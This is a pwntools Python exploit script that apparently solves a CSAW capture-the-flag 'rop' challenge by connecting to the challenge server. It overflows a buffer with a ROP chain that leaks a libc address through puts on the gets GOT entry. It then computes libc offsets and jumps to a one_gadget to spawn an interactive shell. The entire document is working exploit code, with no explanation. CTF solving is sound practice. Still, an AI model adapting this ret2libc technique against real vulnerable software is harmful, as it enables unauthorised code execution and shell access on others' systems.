from pwn import *

def exploit():
    # p = process("./rop")
    p = remote("pwn.chal.csaw.io", 5016)
    binary = ELF("rop")
    gets_got = binary.got['gets']
    puts_plt = binary.plt['puts']
    pop_rdi = 0x0000000000400683
    main = binary.symbols['main']

    padding = 0x28

    payload = 'A' * padding
    payload += p64(pop_rdi)
    payload += p64(gets_got)
    payload += p64(puts_plt)
    payload += p64(main)

    p.sendline(payload)

    p.recvuntil("Hello\n")

    libc_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
    log.info("Libc leak: {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x080120
    log.info("Libc base: {}".format(hex(libc_base)))
    libc_system = libc_base + 0x04f4e0
    log.info("Libc system: {}".format(hex(libc_system)))
    libc_binsh = libc_base + 0x1b40fa
    log.info("Libc /bin/sh: {}".format(hex(libc_binsh)))
    one_gadget = libc_base + 0x4f365
    log.info("Libc one gadget: {}".format(hex(one_gadget)))
    
    payload = ''
    payload += 'A' * padding
    payload += p64(one_gadget)

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()